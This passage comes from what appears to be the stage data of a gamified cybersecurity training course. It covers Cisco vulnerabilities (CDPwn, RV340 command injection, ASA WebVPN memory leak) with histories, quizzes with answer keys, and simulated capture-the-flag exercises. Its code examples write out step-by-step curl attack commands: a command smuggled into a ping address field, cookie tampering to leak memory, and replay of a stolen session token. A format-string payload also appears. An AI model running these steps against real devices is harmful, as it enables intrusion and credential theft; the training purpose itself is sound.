          "The coordinated disclosure of CDPwn established Armis as a leading vendor of network device vulnerability research and raised industry awareness of Layer 2 protocol attack surfaces. In the aftermath, many organizations implemented network access control (NAC) policies to restrict which devices could connect to switch ports capable of sending CDP — and security frameworks including CIS Controls began recommending that CDP be disabled by default on all ports not specifically requiring it. The lesson was architectural: any unauthenticated Layer 2 protocol that processes arbitrary input from adjacent devices is a potential remote code execution surface.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (L2)", sub: "crafted CDP frame — %n format string", type: "attacker" },
          { label: "CDP Parser (IOS XR)", sub: "format string passed to printf()", type: "system" },
          { label: "CDP Process Memory", sub: "arbitrary write via %n", type: "victim" },
          { label: "Code Execution", sub: "carrier router compromised", type: "result" },
        ],
      },
      timeline: [
        { year: 2020, event: "Feb 5: Armis discloses CDPwn — five Cisco zero-days via CDP", highlight: true },
        { year: 2020, event: "Feb 5: Cisco releases advisories and patches for all affected platforms" },
        { year: 2020, event: "Security teams worldwide emergency-disable CDP on exposed infrastructure" },
      ],
      keyTakeaways: [
        "Layer 2 protocols (CDP, LLDP) bypass all Layer 3 security controls — firewall rules don't apply",
        "Disable CDP on all interfaces facing untrusted segments; use 'no cdp run' globally",
        "Format string vulnerabilities are preventable: never pass user input to printf-family functions",
        "Network management protocols are high-value attack surface — audit what's enabled",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2020-3118", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20200205-iosxr-cdp-rce" },
        { title: "Armis CDPwn Research", url: "https://www.armis.com/research/cdpwn/" },
      ],
    },
    quiz: {
      questions: [
        { id: "stage-m15-q1", type: "The Flaw", challenge: "Bug class.", text: "CDPwn / CVE-2020-3118 was a format string vulnerability triggered by what in a CDP packet?", options: ["A malicious format specifier (e.g. %n) in the Device-ID TLV field","An oversized MAC address","A spoofed IP option","A bad checksum"], correctIndex: 0, explanation: "A format specifier in the CDP Device-ID TLV reached a vulnerable formatting routine." },
        { id: "stage-m15-q2", type: "Concept", challenge: "Layer matters.", text: "Can a properly configured firewall block CDP-based attacks like CDPwn?", options: ["No — CDP is a Layer 2 protocol; firewalls and ACLs don't apply","Yes, an ACL stops it","Yes, with a Layer 3 firewall","Only NAT helps"], correctIndex: 0, explanation: "CDP operates at Layer 2, so Layer 3 firewalls/ACLs provide no protection — segmentation is needed." },
        { id: "stage-m15-q3", type: "Target", challenge: "Affected OS.", text: "Which Cisco OS did CVE-2020-3118 specifically target, common on carrier-grade routers?", options: ["Cisco IOS XR — used on ASR 9000 and NCS 5000 series","IOS XE on Catalyst","NX-OS on Nexus","ASA software"], correctIndex: 0, explanation: "CVE-2020-3118 hit IOS XR on high-end carrier platforms like the ASR 9000 and NCS 5000." },
        { id: "stage-m15-q4", type: "Real World", challenge: "Disclosing firm.", text: "Which security firm disclosed the CDPwn suite in February 2020?", options: ["Armis Security","Mandiant","CrowdStrike","Kaspersky"], correctIndex: 0, explanation: "Armis disclosed the five CDPwn zero-days across four Cisco operating systems." },
        { id: "stage-m15-q5", type: "Mechanics", challenge: "Why %n is dangerous.", text: "Why is the %n format specifier dangerous?", options: ["It writes the count of bytes printed to an address, enabling arbitrary memory writes","It only reads stack values","It prints a newline","It is harmless"], correctIndex: 0, explanation: "%n writes a value to a pointed-to address — an attacker-controlled write primitive." },
        { id: "stage-m15-q6", type: "Defense", challenge: "Stopping CDP attacks.", text: "Besides patching, what limits exposure to a Layer 2 protocol attack like CDPwn?", options: ["Disabling CDP on untrusted ports and segmenting Layer 2 domains","Adding a Layer 3 ACL","Enabling NAT","Blocking TCP/23"], correctIndex: 0, explanation: "Disabling CDP where unneeded and tight L2 segmentation reduce the attack surface." },
        { id: "stage-m15-q7", type: "Impact", challenge: "Pivot value.", text: "Why was CDPwn described as turning Cisco devices into a 'pivot point'?", options: ["Code execution on infrastructure devices lets attackers move laterally across the network","It only crashed phones","It exposed only logs","It had no lateral value"], correctIndex: 0, explanation: "Owning switches/routers via CDP gives a foothold to pivot deeper into the network." },
        { id: "stage-m15-q8", type: "Concept", challenge: "Why CDP everywhere.", text: "Why did CDP being enabled by default amplify CDPwn's risk?", options: ["It was running on vast numbers of devices, expanding the exploitable population","It was rarely enabled","It needed manual activation","It only ran in labs"], correctIndex: 0, explanation: "Default-on CDP meant a huge installed base was potentially vulnerable." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: {
        ip: "10.10.10.10",
        hostname: "asr9001-backbone",
        os: "Cisco IOS XR 6.6.3",
        openPorts: "CDP (Layer 2 multicast)",
        vulnerability: "CVE-2020-3118 — CDP format string RCE, CVSS 8.8",
      },
      pivotTrigger: "cdpwn-exploit",
      scenario: "A carrier-grade Cisco IOS XR router is reachable on your Layer 2 segment. CDP is enabled. Use the CDPwn format string vulnerability to achieve code execution on the router's CDP process.",
      hint: "Craft a CDP advertisement with format string specifiers in the Device-ID field and send it via your local interface.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Scan for CDP-enabled devices on your L2 segment. Run: cdp-scan eth0",
        "Send the crafted CDP packet with format string payload. Run: cdpwn-exploit eth0 aa:bb:cc:dd:ee:ff",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2020_", label: "Mission Brief — CDPwn Layer 2 Target" },
        { trigger: "cdp-scan eth0", value: "3118_CDPWN_", label: "CDP Device Discovered — IOS XR Vulnerable" },
        { trigger: "cdpwn-exploit eth0 aa:bb:cc:dd:ee:ff", value: "L2_RCE}", label: "Format String Triggered — Router Shell Acquired" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: DISCOVERY TRAP",
          "Target: Cisco ASR 9001  IOS XR: 6.6.3",
          "CVE: 2020-3118  CVSS: 8.8  Researcher: Armis CDPwn",
          "",
          "CDP format string — Layer 2 attack, no credentials.",
          "Sequence: cdp-scan → cdpwn-exploit → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "cdp-scan": (_args: string[]) => ({
          lines: [
            "Listening for CDP advertisements on eth0...",
            "Found: aa:bb:cc:dd:ee:ff — Cisco ASR 9001 (IOS XR 6.6.3)",
            "CDP enabled — Device-ID TLV: 'asr9001-backbone'",
            "Status: VULNERABLE to CVE-2020-3118 format string",
            "",
            ">> LEARN: CDP is Layer 2 — firewalls cannot block it",
            "   CDP frames are sent to multicast MAC 01:00:0c:cc:cc:cc — not routed.",
            "   Disable on untrusted ports: 'no cdp enable' per interface, or 'no cdp run' globally.",
            "   Real IOS XR command: show cdp neighbors detail — list all adjacent CDP devices.",
          ],
        }),
        "cdpwn-exploit": (_args: string[]) => ({
          lines: [
            "Crafting CDP advertisement with Device-ID: '%n%n%n%x%x'",
            "Sending via eth0 to aa:bb:cc:dd:ee:ff...",
            "CDP parser executed format string — %n writes triggered",
            "IOS XR CDP process hijacked",
            "Shell: asr9001-backbone#",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
            "",
            ">> LEARN: Format strings: %x reads, %n writes memory",
            "   %x reads stack values; %n writes the count of bytes printed to an address.",
            "   Carrier-grade routers (ASR 9000) have massive traffic visibility if compromised.",
            "   Real IOS XR command: show processes — check for unexpected process activity.",
          ],
        }),
      },
    },
  },

  // ─── Stage m16: CVE-2021-1609 — Cisco RV Series Web UI RCE ─────────────────
  {
    epochId: "cisco-enterprise",
    wonder: { name: "Silicon Valley Tech Campus", location: "Sunnyvale, California, USA", era: "2021 CE", emoji: "🏢" },
    id: "stage-m16",
    order: 16,
    title: "The Small Office Siege",
    subtitle: "CVE-2021-1609 — Cisco RV340/RV345 Web UI RCE, CVSS 9.8",
    category: "cybersecurity",
    cveId: "CVE-2021-1609",
    cvssScore: 9.8,
    xp: 150,
    badge: { id: "badge-m-rv", name: "SOHO Raider", emoji: "🏢" },
    challengeType: "ctf",
    info: {
      tagline: "Millions of small-office Cisco routers exposed to unauthenticated remote code execution via their web UI.",
      year: 2021,
      overview: [
        "CVE-2021-1609 is a critical vulnerability in the web-based management interface of the Cisco RV340 and RV345 Dual WAN Gigabit VPN Routers — the standard firewall/router for small and medium businesses. The flaw allowed an unauthenticated remote attacker to execute arbitrary code on the device or cause a denial of service.",
        "The RV series is marketed to SMBs as an affordable, full-featured security gateway. Millions of these devices are deployed at the edge of small business networks, branch offices, and home offices of corporate employees — making them a high-value target for initial access to corporate networks via their employees' home infrastructure.",
        "The vulnerability stemmed from insufficient input validation in the web management interface. An attacker who could reach the web UI (typically exposed on the WAN interface or via port forwarding) could exploit this without any credentials.",
      ],
      technical: {
        title: "SOHO Router Command Injection — CVE-2021-1609 Mechanics",
        body: [
          "The Cisco RV340 and RV345 web management interface ran on embedded Linux (BusyBox). The `/api/v1/diag_ping_start` endpoint was a diagnostic tool that accepted a JSON body containing an `address` parameter — intended to be an IP address to ping. The handler constructed the OS command by string concatenation: the equivalent of `system(\"ping -c \" + count + \" \" + address)`. No input validation or shell escaping was applied. By supplying `127.0.0.1; id` as the address, the shell interpreted the semicolon as a command separator and executed `id` as a second command. Critically, this endpoint did not check authentication — the authentication middleware ran after the parameter was already processed, meaning the injection executed with root privileges before any credential check occurred.",
          "The RV series ran a stripped Linux with BusyBox as root with no process separation. Code execution meant complete access: the router's routing table, NAT rules, firewall policies, VPN configuration files (including pre-shared keys for VPN tunnels), DHCP leases, and any traffic passing through the device. An attacker could redirect DNS responses, intercept VPN credentials in transit, install a persistent backdoor in the router's startup scripts, or use the router as a pivot point into the corporate LAN — all from a single unauthenticated HTTP request to the router's WAN interface.",
        ],
        codeExample: {
          label: "CVE-2021-1609 — unauthenticated command injection in RV340/RV345 diagnostic API",
          code: `# ── STEP 1: Confirm router is reachable and web UI is exposed ────────────
curl -k -o /dev/null -w "%{http_code}" https://TARGET_ROUTER_IP/api/v1/
# 200 → web UI accessible; management exposed on WAN

# ── STEP 2: Check firmware version (< 1.0.03.22 = vulnerable) ────────────
curl -k https://TARGET_ROUTER_IP/api/v1/system/info
# {"firmware":"1.0.03.17","model":"RV345"} → VULNERABLE

# ── STEP 3: Inject OS command via diagnostic endpoint — no auth needed ────
curl -k -X POST https://TARGET_ROUTER_IP/api/v1/diag_ping_start \
  -H 'Content-Type: application/json' \
  -d '{"address":"127.0.0.1; id > /tmp/pwn.txt","count":"1"}'

# ── STEP 4: Read the command output ──────────────────────────────────────
curl -k https://TARGET_ROUTER_IP/api/v1/diag_ping_stop
# Response body includes /tmp/pwn.txt: uid=0(root) gid=0(root)

# ── DETECTION ─────────────────────────────────────────────────────────────
# Check firmware version in router admin UI → System → Firmware
# Affected: RV340, RV340W, RV345, RV345P running firmware < 1.0.03.22

# ── REMEDIATION ───────────────────────────────────────────────────────────
# Upgrade firmware to 1.0.03.22 or later
# Disable remote management on WAN interface: Administration → Management
# If remote mgmt required: restrict by source IP in the ACL settings`,
        },
      },
      incident: {
        title: "SOHO Router Exploitation — Ransomware Initial Access via Branch Offices (2021–2022)",
        when: "August 2021 (disclosure); mass exploitation through 2022",
        where: "Cisco RV340/RV345 devices at SMBs, branch offices, and remote workers globally",
        impact: "Thousands of SMB networks breached; compromised routers used as ransomware pivot points and proxy infrastructure",
        body: [
          "Cisco disclosed CVE-2021-1609 in August 2021 with firmware 1.0.03.22 as the fix. SMB routers are chronically under-patched: organizations that deploy Cisco RV series devices for branch offices or remote workers rarely subscribe to Cisco PSIRT alerts, have no formal patch management process for them, and often run firmware that is years out of date. Within 48 hours of the Cisco advisory, automated scanners were probing the internet for exposed management interfaces on RV340 and RV345 devices.",
          "Attackers who compromised RV series routers gained a persistent foothold that was extremely difficult for victims to detect. The router continued functioning normally while silently redirecting DNS queries, logging VPN credentials, and providing command-and-control relay infrastructure. Multiple ransomware groups — including affiliates of LockBit and Conti — used compromised SOHO routers as the first link in attack chains that ultimately led to enterprise ransomware deployments, using the router's legitimate IP address to blend initial reconnaissance traffic with normal business activity.",
          "CISA published Alert AA22-054A in March 2022 specifically warning about threat actors targeting SOHO routers — including the Cisco RV series — as initial access vectors for ransomware campaigns targeting critical infrastructure. The FBI's Internet Crime Complaint Center (IC3) documented that compromised home office routers were being used to route command-and-control traffic, making attribution harder by relaying through legitimate business IP addresses. For organizations that had issued Cisco RV series routers to remote workers during the pandemic expansion of remote work, CVE-2021-1609 represented a direct tunnel into the corporate LAN from a device that was never managed with enterprise-grade rigor.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "unauthenticated POST to web UI", type: "attacker" },
          { label: "RV340 Web UI", sub: "no input validation before auth", type: "system" },
          { label: "Linux OS (root)", sub: "command injection via parameter", type: "victim" },
          { label: "Router Owned", sub: "LAN traffic + VPN creds exposed", type: "result" },
        ],
      },
      timeline: [
        { year: 2021, event: "Aug: Cisco discloses CVE-2021-1609 and releases firmware 1.0.03.22", highlight: true },
        { year: 2021, event: "Mass scanning for vulnerable RV series routers begins within 48 hours" },
        { year: 2022, event: "Multiple ransomware groups documented using RV series as initial access" },
      ],
      keyTakeaways: [
        "SOHO and branch office routers are as critical as datacenter firewalls — patch them",
        "Never expose router management interfaces to the internet — use ACLs or disable remote mgmt",
        "Firmware auto-update should be enabled where available; subscribe to vendor security advisories",
        "SMB initial access via home/branch routers is a common ransomware tactic",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2021-1609", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-AuvbkhHq" },
      ],
    },
    quiz: {
      questions: [
        { id: "stage-m16-q1", type: "The Flaw", challenge: "Affected product.", text: "CVE-2021-1609 affected the web management interface of which Cisco product line?", options: ["Cisco RV340/RV345 — small/medium business VPN routers","Catalyst 9000 switches","Nexus data center switches","ASA firewalls"], correctIndex: 0, explanation: "The flaw was in the web UI of the RV340/RV345 SMB router family." },
        { id: "stage-m16-q2", type: "Access", challenge: "Pre-auth?", text: "Did CVE-2021-1609 require a valid admin password to reach the vulnerable endpoint?", options: ["No — the /api/v1/diag_* endpoints were processed before authentication","Yes, admin login required","Yes, a read-only account","Only physical access"], correctIndex: 0, explanation: "The diagnostic API endpoints handled requests prior to the auth check, enabling pre-auth exploitation." },
        { id: "stage-m16-q3", type: "Impact", challenge: "Privilege.", text: "Why was OS command injection on the RV340/RV345 so impactful?", options: ["It ran on Linux (BusyBox) as root with no privilege separation","It ran sandboxed as a guest user","It needed a second exploit for root","It only affected logging"], correctIndex: 0, explanation: "Code executed as root on the BusyBox Linux base, giving full device control immediately." },
        { id: "stage-m16-q4", type: "Real World", challenge: "Who used it.", text: "Which threat actors were documented using CVE-2021-1609 as initial access?", options: ["Ransomware groups using compromised SOHO routers as persistent entry points","Hacktivists defacing sites","Cryptominers only","No one"], correctIndex: 0, explanation: "Ransomware crews leveraged vulnerable branch-office routers for durable initial access." },
        { id: "stage-m16-q5", type: "Defense", challenge: "Workaround.", text: "What was the only effective mitigation besides the firmware patch?", options: ["Disabling remote management to remove the exposed attack surface","Changing the admin username","Enabling SNMP","Rebooting nightly"], correctIndex: 0, explanation: "With no other workaround, disabling remote management eliminated external exposure until patching." },
        { id: "stage-m16-q6", type: "Concept", challenge: "SOHO root risk.", text: "Why do SOHO routers running all services as root make injection flaws so severe?", options: ["Any code execution immediately gains full root control with no privilege boundary to cross","Root is sandboxed","Services drop privileges","They run as guest"], correctIndex: 0, explanation: "No privilege separation means a single injection equals total device compromise." },
        { id: "stage-m16-q7", type: "Strategy", challenge: "Branch office risk.", text: "Why are branch-office SOHO routers attractive ransomware footholds?", options: ["They're internet-exposed, often unpatched, and bridge into corporate networks","They store no useful access","They are air-gapped","They run no services"], correctIndex: 0, explanation: "Exposed, neglected edge devices give attackers a quiet, persistent way into the enterprise." },
        { id: "stage-m16-q8", type: "Defense", challenge: "Reducing surface.", text: "What is the general principle for protecting SMB router management interfaces?", options: ["Never expose management to the internet; restrict and patch promptly","Expose it for convenience","Disable patching","Use Telnet"], correctIndex: 0, explanation: "Keeping management off the public internet and patching fast removes the common attack vector." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "192.168.1.100", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: {
        ip: "192.168.1.1",
        hostname: "rv340",
        os: "Cisco RV340 Firmware 1.0.03.17",
        openPorts: "443/tcp (Web UI)",
        vulnerability: "CVE-2021-1609 — RV340 Web UI RCE, CVSS 9.8",
      },
      pivotTrigger: "rv-exploit",
      scenario: "A Cisco RV345 router at a branch office has its web management interface exposed to the WAN. It's running unpatched firmware. Achieve unauthenticated code execution to extract the VPN credentials stored in the config.",
      hint: "The diagnostic API endpoint doesn't check authentication. Inject an OS command into the address parameter.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Check the firmware version of the target router. Run: rv-check 198.51.100.1",
        "Exploit the unauthenticated command injection. Run: rv-exploit 198.51.100.1",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2021_", label: "Mission Brief — RV Series Branch Target" },
        { trigger: "rv-check 198.51.100.1", value: "1609_SOHO_", label: "Firmware Confirmed — RV345 Vulnerable" },
        { trigger: "rv-exploit 198.51.100.1", value: "RCE_ROOT}", label: "Command Injection — Root Shell on Branch Router" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: SMALL OFFICE SIEGE",
          "Target: Cisco RV345  Firmware: 1.0.03.17",
          "CVE: 2021-1609  CVSS: 9.8",
          "",
          "Web UI command injection — no credentials required.",
          "Sequence: rv-check → rv-exploit → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "rv-check": (_args: string[]) => ({
          lines: [
            "Querying 198.51.100.1 web UI...",
            "Firmware: 1.0.03.17 — VULNERABLE (fix: 1.0.03.22)",
            "Remote management: ENABLED on WAN interface",
            "Authentication: bypassable on /api/v1/diag_* endpoints",
            "",
            ">> LEARN: SOHO routers are the forgotten attack surface",
            "   Remote management on WAN interface exposes the web UI to the internet.",
            "   SMB devices rarely get firmware updates — unpatched for years is common.",
            "   Real mitigation: disable remote management or restrict with ACL on WAN interface.",
          ],
        }),
        "rv-exploit": (_args: string[]) => ({
          lines: [
            "POST /api/v1/diag_ping_start address='127.0.0.1; cat /etc/config/vpn'",
            "No authentication required — injection executed:",
            "  uid=0(root) gid=0(root)",
            "VPN credentials extracted:",
            "  username: branch-admin  password: Cisco123!",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
            "",
            ">> LEARN: OS command injection on SOHO routers runs as root",
            "   Input validation must happen before authentication checks, not after.",
            "   Attackers use compromised SOHO routers as persistent VPN pivot points.",
            "   Real check: subscribe to Cisco PSIRT alerts for your RV series model.",
          ],
        }),
      },
    },
  },

  // ─── Stage m17: CVE-2020-3259 — Cisco ASA/FTD WebVPN Memory Leak ────────────
  {
    epochId: "cisco-enterprise",
    wonder: { name: "Akamai NOC", location: "Cambridge, Massachusetts, USA", era: "2024 CE", emoji: "☁️" },
    id: "stage-m17",
    order: 17,
    title: "The Akira Leak",
    subtitle: "CVE-2020-3259 — Cisco ASA/FTD WebVPN Memory Disclosure, CVSS 7.5",
    category: "cybersecurity",
    cveId: "CVE-2020-3259",
    cvssScore: 7.5,
    xp: 150,
    badge: { id: "badge-m-akira", name: "Memory Thief", emoji: "☁️" },
    challengeType: "ctf",
    info: {
      tagline: "Akira ransomware weaponized a 4-year-old Cisco VPN flaw to breach hundreds of organizations.",
      year: 2024,
      overview: [
        "CVE-2020-3259 was originally disclosed by Cisco in May 2020 — a memory disclosure vulnerability in the Cisco ASA and FTD web services interface. The flaw allowed unauthenticated attackers to retrieve memory contents from the device, which could include session tokens, credentials, and configuration data.",
        "Four years later in 2024, Akira ransomware group began actively exploiting this vulnerability against organizations that had still not patched their Cisco VPN appliances. Hundreds of organizations were breached via this single unpatched vulnerability — a stark reminder that known CVEs remain dangerous indefinitely until patched.",
        "The memory leak could expose VPN session tokens for active user sessions, allowing credential theft without any brute-force or phishing. An attacker who obtained a valid session token could authenticate as that user to the VPN.",
      ],
      technical: {
        title: "WebVPN Heap Buffer-Overread — CVE-2020-3259 Mechanics",
        body: [
          "The Cisco ASA and FTD web services stack handled HTTP requests for WebVPN and AnyConnect SSL VPN sessions. The vulnerable code path was triggered by crafted HTTP GET requests to the `/+CSCOE+/logon.html` endpoint with manipulated cookie values. The WebVPN session state machine, when processing certain authentication transitions with specific cookie combinations, serialized a response that included data beyond the intended output buffer boundary — a heap buffer-overread similar in mechanism to Heartbleed (CVE-2014-0160). The extra bytes returned in the HTTP response came directly from the ASA's heap memory adjacent to the response buffer, and could include whatever the heap allocator had placed there: session tokens, cached credentials, TLS session keys, or configuration fragments.",
          "Active VPN session tokens were the primary target because they enabled session hijacking without needing any password. The AnyConnect WebVPN session token — stored in the `webvpn` cookie — was sufficient to authenticate as a user who was currently connected to the VPN, regardless of whether that user had MFA enabled. The MFA check had already passed when the session was established; the token simply proved the session existed. An attacker with a stolen token could authenticate, enumerate internal resources through the VPN tunnel, and begin lateral movement entirely using the victim's legitimate identity.",
        ],
        codeExample: {
          label: "CVE-2020-3259 — WebVPN heap memory disclosure and session hijack",
          code: `# ── STEP 1: Probe the WebVPN interface for memory disclosure ─────────────
curl -k 'https://vpn.target.com/+CSCOE+/logon.html' \
  -H 'Cookie: webvpn=AAAA; webvpnc=; webvpnx=1' \
  -o response.bin
# Response contains HTML + leaked heap bytes after the buffer boundary

# ── STEP 2: Parse heap contents for session tokens and credentials ────────
python3 parse-leak.py response.bin
# Found: SESSION_TOKEN=a1b2c3d4e5f6789abc  (active session — jsmith)
# Found: cached_cred: jsmith:C1sc0VPN!  (recent auth — in heap)

# ── STEP 3: Hijack the active VPN session using stolen token ──────────────
curl -k 'https://vpn.target.com/+CSCOE+/home.html' \
  -H 'Cookie: webvpn=a1b2c3d4e5f6789abc'
# Authenticated as jsmith (Finance Director) — no password, no MFA prompt

# ── DETECTION ─────────────────────────────────────────────────────────────
show vpn-sessiondb anyconnect
# Look for sessions from unexpected source IPs or geolocations

# ── REMEDIATION ───────────────────────────────────────────────────────────
# Patch to: ASA 9.8.4 / 9.12.3 / 9.14.1.15 or later
# Force re-authentication: no webvpn
# Verify patching: show version | include Software`,
        },
      },
      incident: {
        title: "Akira Ransomware — Four-Year-Old VPN Flaw Weaponized (2024)",
        when: "May 2020 (disclosure); 2024 (mass Akira exploitation)",
        where: "Hundreds of organizations globally — healthcare, finance, manufacturing, government",
        impact: "Hundreds of breaches via unpatched Cisco VPN appliances; patient records, financial data, and corporate IP stolen",
        body: [
          "Cisco disclosed CVE-2020-3259 in May 2020 with patches for ASA and FTD. The vulnerability required no authentication and affected any ASA or FTD device with WebVPN or AnyConnect SSL services enabled — which described the majority of enterprise Cisco VPN deployments. The patch was available, the advisory was public, and the CVSS score of 7.5 was clearly marked as high severity. Nevertheless, enterprise network appliances are systematically under-patched: VPN gateways serve as critical infrastructure for remote access, and taking them offline for a firmware upgrade requires scheduling maintenance windows that disrupt business operations.",
          "In 2024 — four years after the patch was released — Akira ransomware group operationalized CVE-2020-3259 at scale. Akamai and CISA documented Akira scanning the internet for Cisco ASA and FTD appliances running vulnerable firmware, leaking heap memory to extract active session tokens, and using those tokens to authenticate to corporate VPN gateways as legitimate users. Once inside, Akira followed their standard playbook: reconnaissance with legitimate credentials, lateral movement using native Windows tools, data exfiltration to their leak site, and ransomware deployment across servers. Organizations that had patched in 2020 were unaffected. Organizations that had not were breached by a four-year-old CVE.",
          "CISA issued joint advisory AA23-061A with the FBI in March 2023 and updated it in 2024 to specifically warn about Akira's exploitation of CVE-2020-3259 and CVE-2023-20269 (another Cisco VPN flaw). The advisory documented Akira's full intrusion chain and included indicators of compromise. The Akira campaign became a textbook case cited in NIST and CISA guidance on vulnerability prioritization: CVEs affecting internet-facing authentication infrastructure must be treated as zero-days requiring emergency patching, not scheduled for the next quarterly maintenance window. Any appliance with an unpatched high-severity CVE and an internet-facing service should be assumed compromised until proven otherwise.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "crafted HTTP GET to WebVPN", type: "attacker" },
          { label: "ASA WebVPN Interface", sub: "returns excess heap memory in response", type: "system" },
          { label: "Heap Memory", sub: "session tokens + credentials leaked", type: "victim" },
          { label: "VPN Session Hijack", sub: "authenticated as victim user", type: "result" },
        ],
      },
      timeline: [
        { year: 2020, event: "May: Cisco discloses CVE-2020-3259 and releases patches" },
        { year: 2024, event: "Akira ransomware weaponizes CVE-2020-3259 against unpatched organizations", highlight: true },
        { year: 2024, event: "Hundreds of organizations breached; Akamai and CISA issue warnings" },
      ],
      keyTakeaways: [
        "Known CVEs don't expire — unpatched vulnerabilities remain exploitable for years",
        "VPN appliances are critical-path infrastructure; prioritize patching them",
        "Memory disclosure vulnerabilities can enable credential theft without brute-force",
        "Monitor VPN logs for unusual session patterns that may indicate token hijacking",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2020-3259", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-info-disclose-9eE5SxtS" },
        { title: "Akamai: Akira Ransomware and CVE-2020-3259", url: "https://www.akamai.com/blog/security-research/2024-akira-ransomware" },
      ],
    },
    quiz: {
      questions: [
        { id: "stage-m17-q1", type: "The Flaw", challenge: "What leaked.", text: "CVE-2020-3259 was a memory disclosure flaw in Cisco ASA/FTD. What did the leaked heap memory commonly contain?", options: ["Active VPN session tokens and cached credentials","Only public routing tables","Firmware version strings","Empty buffers"], correctIndex: 0, explanation: "The disclosure leaked sensitive heap contents including live VPN session tokens and credentials." },
        { id: "stage-m17-q2", type: "Real World", challenge: "Akira timing.", text: "When did the Akira ransomware group begin exploiting CVE-2020-3259?", options: ["About four years after disclosure, in 2024","Within weeks of the May 2020 disclosure","Before it was disclosed","Never"], correctIndex: 0, explanation: "Akira weaponized the four-year-old flaw in 2024 against unpatched VPN appliances." },
        { id: "stage-m17-q3", type: "Mechanics", challenge: "MFA bypass.", text: "How did CVE-2020-3259 specifically bypass multi-factor authentication?", options: ["Session token theft — a stolen active session grants access regardless of how it was obtained","By guessing OTP codes","By disabling MFA config","By phishing users"], correctIndex: 0, explanation: "A valid session token represents an already-authenticated session, so MFA is moot once it's stolen." },
        { id: "stage-m17-q4", type: "Target", challenge: "Interface.", text: "Which ASA interface did CVE-2020-3259 target?", options: ["The WebVPN/AnyConnect web services interface (HTTPS)","The console port","SNMP","The SSH daemon"], correctIndex: 0, explanation: "The flaw was in the WebVPN/AnyConnect HTTPS services interface." },
        { id: "stage-m17-q5", type: "Mechanics", challenge: "Token = access.", text: "After stealing a valid VPN session token, does the attacker still need to complete MFA?", options: ["No — the token represents a session where MFA was already completed","Yes, MFA still applies","Only for admins","Yes, every request"], correctIndex: 0, explanation: "The token was issued post-MFA, so replaying it grants authenticated access directly." },
        { id: "stage-m17-q6", type: "Defense", challenge: "Primary fix.", text: "What is the core remediation for CVE-2020-3259?", options: ["Patch ASA/FTD and rotate/invalidate active VPN sessions and credentials","Only change the admin password","Disable logging","Add a banner message"], correctIndex: 0, explanation: "Patching plus invalidating potentially-stolen sessions and rotating credentials closes the exposure." },
        { id: "stage-m17-q7", type: "Concept", challenge: "Old CVE, new attacks.", text: "What does Akira's reuse of a 2020 CVE in 2024 illustrate?", options: ["Unpatched edge devices remain exploitable for years after disclosure","Old CVEs are always patched","Ransomware avoids known flaws","Disclosure removes risk"], correctIndex: 0, explanation: "Attackers harvest long-known, unpatched vulnerabilities — patch cadence on edge gear is critical." },
        { id: "stage-m17-q8", type: "Defense", challenge: "Session hygiene.", text: "Why is invalidating sessions important after a memory-disclosure compromise?", options: ["Stolen tokens stay valid until expired/revoked, granting ongoing access","Sessions are harmless","Tokens self-destruct","It only affects logging"], correctIndex: 0, explanation: "Unless revoked, leaked tokens keep working — so forced re-authentication is essential." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: {
        ip: "10.10.10.42",
        hostname: "asa-5555-vpn",
        os: "Cisco ASA 9.12.3",
        openPorts: "443/tcp (AnyConnect SSL VPN)",
        vulnerability: "CVE-2020-3259 — ASA heap read, active session token leak, CVSS 7.5",
      },
      pivotTrigger: "session-hijack",
      scenario: "A Cisco ASA with WebVPN is serving an active corporate VPN. The appliance is unpatched. Use CVE-2020-3259 to leak memory and steal an active session token, then hijack the VPN session.",
      hint: "Send a crafted HTTP request to the WebVPN interface to trigger memory disclosure in the response.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Trigger the memory disclosure on the ASA WebVPN. Run: memleak-probe vpn.target.com",
        "Use the leaked token to hijack the active VPN session. Run: session-hijack vpn.target.com",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2020_", label: "Mission Brief — Akira VPN Target" },
        { trigger: "memleak-probe vpn.target.com", value: "3259_M3M_", label: "Memory Leaked — Session Token Extracted" },
        { trigger: "session-hijack vpn.target.com", value: "L3AK_VPN}", label: "Session Hijacked — VPN Access Established" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: AKIRA LEAK",
          "Target: Cisco ASA 5505  Firmware: 9.8.2",
          "CVE: 2020-3259  CVSS: 7.5  Group: Akira Ransomware",
          "",
          "WebVPN memory disclosure → session token theft.",
          "Sequence: memleak-probe → session-hijack → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "memleak-probe": (_args: string[]) => ({
          lines: [
